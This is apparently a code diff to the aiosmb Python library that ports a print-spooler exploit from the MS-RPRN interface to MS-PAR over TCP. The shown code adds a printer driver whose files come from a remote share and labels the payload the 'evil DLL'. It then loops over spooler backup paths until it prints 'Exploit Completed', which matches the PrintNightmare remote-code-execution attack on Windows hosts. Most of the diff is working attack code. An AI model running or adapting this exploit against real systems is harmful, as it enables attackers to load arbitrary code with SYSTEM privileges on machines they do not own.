@@ -1,15 +1,17 @@
 import traceback
-import asyncio
 from aiosmb.dcerpc.v5.common.connection.smbdcefactory import SMBDCEFactory
-from aiosmb.dcerpc.v5 import rprn
+from aiosmb.dcerpc.v5 import par
 from aiosmb.dcerpc.v5.dtypes import RPC_SID
 from aiosmb.wintypes.ntstatus import NTStatus
 from aiosmb import logger
 from aiosmb.dcerpc.v5.dtypes import NULL
 from aiosmb.commons.utils.decorators import red, rr, red_gen
+from aiosmb.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
+from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
+
 import pathlib
 
-class SMBRPRN:
+class SMBPAR:
 	def __init__(self, connection):
 		self.connection = connection
 		self.service_manager = None
@@ -27,12 +29,41 @@ class SMBRPRN:
 		await self.close()
 		return True,None
 	
-	@red
-	async def connect(self, open = True):
-		rpctransport = SMBDCEFactory(self.connection, filename=r'\spoolss')
-		self.dce = rpctransport.get_dce_rpc()
-		await rr(self.dce.connect())
-		await rr(self.dce.bind(rprn.MSRPC_UUID_RPRN))
+	async def connect(self, open = False):
+		try:
+			epm = EPM(self.connection, protocol = 'ncacn_ip_tcp')
+			_, err = await epm.connect()
+			if err is not None:
+				raise err
+			stringBinding, _ = await epm.map(par.MSRPC_UUID_PAR)
+			self.dce = epm.get_connection_from_stringbinding(stringBinding)
+
+			#the line below must be set!
+			self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+
+			_, err = await self.dce.connect()
+			if err is not None:
+				raise err
+
+			if open == True:
+				_, err = await self.open()
+				if err is not None:
+					raise err
+			return True, None
+		except Exception as e:
+			return False, e
+		finally:
+			if epm is not None:
+				await epm.disconnect()
+
+	async def open(self):
+		if self.dce is None:
+			_, err = await self.dce.connect()
+			if err is not None:
+				return None, err
+		_, err = await self.dce.bind(par.MSRPC_UUID_PAR, transfer_syntax = ('8A885D04-1CEB-11C9-9FE8-08002B104860', '2.0'))
+		if err is not None:
+			return None, err
 
 		return True,None
 	
@@ -47,35 +78,10 @@ class SMBRPRN:
 		
 		return True,None
 	
-	@red
-	async def open_printer(self, printerName, pDatatype = NULL, pDevModeContainer = NULL, accessRequired = rprn.SERVER_READ):
-		resp, _ = await rr(rprn.hRpcOpenPrinter(self.dce, printerName, pDatatype, pDevModeContainer, accessRequired))
-		handle_no = self.handle_ctr
-		self.handle_ctr += 1
-		self.printer_handles[handle_no] = resp['pHandle']
-
-		return handle_no, None
-	
-	@red
-	async def hRpcRemoteFindFirstPrinterChangeNotificationEx(self, handle, fdwFlags, fdwOptions=0, pszLocalMachine=NULL, dwPrinterLocal=0, pOptions=NULL):
-		
-		handle = self.printer_handles[handle]
-		resp, _ = await rr(rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
-			self.dce, 
-			handle, 
-			fdwFlags, 
-			fdwOptions=fdwOptions,
-			pszLocalMachine=pszLocalMachine,
-			dwPrinterLocal=dwPrinterLocal, 
-			pOptions=pOptions
-		))
-
-		return resp, None
-	
 	async def enum_drivers(self, environments, level = 2, name = ''):
 		if environments[-1] != '\x00':
 			environments += '\x00'
-		drivers, err = await rprn.hRpcEnumPrinterDrivers(self.dce, name, environments, level)
+		drivers, err = await par.hRpcAsyncEnumPrinterDrivers(self.dce, name, environments, level)
 		if err is not None:
 			return None, err
 		return drivers, None
@@ -109,7 +115,7 @@ class SMBRPRN:
 			if share[-1] != '\x00':
 				share += '\x00'
 
-			container_info = rprn.DRIVER_CONTAINER()
+			container_info = par.DRIVER_CONTAINER()
 			container_info['Level'] = 2
 			container_info['DriverInfo']['tag'] = 2
 			container_info['DriverInfo']['Level2']['cVersion']     = 3
@@ -119,11 +125,11 @@ class SMBRPRN:
 			container_info['DriverInfo']['Level2']['pDataFile']    = share
 			container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"
 
-			flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
+			flags = par.APD_COPY_ALL_FILES | 0x10 | 0x8000
 			filename = share.split("\\")[-1]
 
 			#### Triggering the download of the evil DLL
-			resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
+			resp, err = await par.hRpcAsyncAddPrinterDriver(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
 			if err is not None:
 				raise err
 			if silent is False:
@@ -131,7 +137,7 @@ class SMBRPRN:
 
 			#### Triggering a change in the new printer's config which automatically creates a backup of the evil DLL
 			container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\kernelbase.dll\x00"
-			resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
+			resp, err = await par.hRpcAsyncAddPrinterDriver(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
 			if err is not None:
 				raise err
 			if silent is False:
@@ -141,11 +147,11 @@ class SMBRPRN:
 			for i in range(1, 30):
 				try:
 					container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
-					resp, err = await rprn.hRpcAddPrinterDriverEx(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
+					resp, err = await par.hRpcAsyncAddPrinterDriver(self.dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
 					if err is not None:
 						raise err
 					if silent is False:
-						print("[*] Stage %s: %s" % (i+1, resp['ErrorCode']))
+						print("[*] Stage {0}: {1}".format(i+1, resp['ErrorCode']))
 					if (resp['ErrorCode'] == 0):
 						if silent is False:
 							print("[+] Exploit Completed")
